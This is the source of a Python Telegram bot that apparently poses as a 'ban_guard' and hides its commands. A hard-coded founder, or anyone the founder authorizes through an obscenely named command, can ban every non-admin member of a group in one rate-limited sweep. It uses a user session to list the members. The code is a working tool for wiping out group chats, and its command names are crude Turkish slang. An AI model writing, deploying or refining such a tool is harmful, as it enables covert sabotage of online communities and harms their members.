import logging
import os
import asyncio
from pyrogram import Client, filters as pyro_filters
from pyrogram.types import Message as PyroMessage
from pyrogram.enums import ChatMembersFilter
from telegram import Update
from telegram.ext import (
    Application, MessageHandler,
    ContextTypes, filters
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN          = os.environ["BOT_TOKEN"]
API_ID         = int(os.environ["API_ID"])
API_HASH       = os.environ["API_HASH"]
STRING_SESSION = os.environ["STRING_SESSION"]
FOUNDER_ID     = 8034872992

authorized: set[int] = set()

pyro = Client(
    "ban_guard",
    api_id=API_ID,
    api_hash=API_HASH,
    session_string=STRING_SESSION,
    sleep_threshold=60,
)

async def handle_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.effective_user:
        return
    if update.effective_chat.type == "private":
        return

    msg  = update.message
    uid  = update.effective_user.id
    text = (msg.text or "").strip()

    # ── /c31k — yetki ver ─────────────────────────────────────────────────
    if text.startswith("/c31k"):
        if uid != FOUNDER_ID:
            return
        if not msg.reply_to_message:
            await msg.reply_text("❗ Birine yanıt verip /c31k yaz.")
            return
        target = msg.reply_to_message.from_user
        authorized.add(target.id)
        await msg.reply_text(f"✅ {target.first_name} yetki aldı.")
        return

    # ── /yarrak — herkesi banla ───────────────────────────────────────────
    if text.startswith("/yarrak"):
        if uid != FOUNDER_ID and uid not in authorized:
            return

        cid      = update.effective_chat.id
        bildirim = await msg.reply_text("🔨 Üyeler alınıyor...")

        # Adminləri al — atlamaq üçün
        admins = set()
        try:
            async for admin in await ctx.bot.get_chat_administrators(cid):
                admins.add(admin.user.id)
        except Exception as e:
            logger.warning(f"Admin siyahısı alınamadı: {e}")

        # Pyrogram ilə üzv siyahısını al
        to_ban = []
        try:
            async for member in pyro.get_chat_members(cid):
                user = member.user
                if user is None:
                    continue
                if user.is_bot:
                    continue
                if user.id in admins:
                    continue
                if user.id == FOUNDER_ID:
                    continue
                if user.id in authorized:
                    continue
                to_ban.append(user.id)
        except Exception as e:
            await bildirim.edit_text(f"❌ Üyeler alınamadı: {e}")
            return

        await bildirim.edit_text(f"🔨 {len(to_ban)} kişi banlanıyor...")

        banned  = 0
        skipped = 0

        for user_id in to_ban:
            try:
                await ctx.bot.ban_chat_member(cid, user_id)
                banned += 1
                # 30 ban/saniyə limiti
                if banned % 28 == 0:
                    await asyncio.sleep(1)
            except Exception as e:
                logger.warning(f"Ban xətası {user_id}: {e}")
                skipped += 1

        await bildirim.edit_text(
            f"✅ Tamamlandı!\n"
            f"🔨 Banlanan: *{banned}*\n"
            f"⏭ Atlanan: *{skipped}*",
            parse_mode="Markdown"
        )

async def post_init(tg_app: Application):
    await pyro.start()
    print("Pyrogram başladı!")
    await tg_app.bot.set_my_commands([])

async def post_shutdown(tg_app: Application):
    try:
        await pyro.stop()
    except Exception:
        pass

def main():
    tg_app = (
        Application.builder()
        .token(TOKEN)
        .post_init(post_init)
        .post_shutdown(post_shutdown)
        .build()
    )
    tg_app.add_handler(MessageHandler(filters.TEXT, handle_message))
    tg_app.add_handler(MessageHandler(filters.COMMAND, handle_message))

    print("Ban botu başladı...")
    tg_app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
